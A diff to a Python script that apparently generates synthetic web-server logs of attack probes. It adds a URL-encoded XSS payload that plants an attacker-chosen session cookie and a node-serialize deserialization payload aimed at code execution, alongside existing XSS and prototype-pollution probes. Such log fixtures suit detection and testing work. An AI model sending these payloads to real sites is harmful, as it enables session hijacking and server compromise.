@@ -660,6 +660,8 @@ def xss_attempts(ip: str, day: int, hour: int) -> None:
         "/search?q=%22%3Balert%281%29%2F%2F",
         "/search?q=%3Cd%20i%20a%20l%20o%20g%20open%3E",
         "/c/lighting?view=x%3Aurl%28javascript%3Aalert%281%29%29",
+        # And the point of all of it: script that plants a session cookie.
+        "/search?q=%3Cscript%3Edocument.cookie%3D%27sid%3Dattacker%3Bexpires%3DFri%2C%201%20Jan%202027%27%3C/script%3E",
     ):
         write(t, ip, f"GET {probe} HTTP/1.1", 200, 12_400, agent=BROWSER)
         t += timedelta(seconds=6)
@@ -792,6 +794,8 @@ def perl_and_node(ip: str, day: int, hour: int) -> None:
         "/cart/update?constructor%5Bprototype%5D%5BisAdmin%5D=true",
         # A loop with no exit.
         "/render?eval=while%28true%29%3B",
+        # node-serialize's marker, which the library evaluates.
+        "/profile?data=%7B%22rce%22%3A%22_%24%24ND_FUNC%24%24_function%28%29%7Bid%7D%28%29%22%7D",
     ):
         write(t, ip, f"GET {probe} HTTP/1.1", 500, 0, agent=CURL)
         t += timedelta(seconds=11)
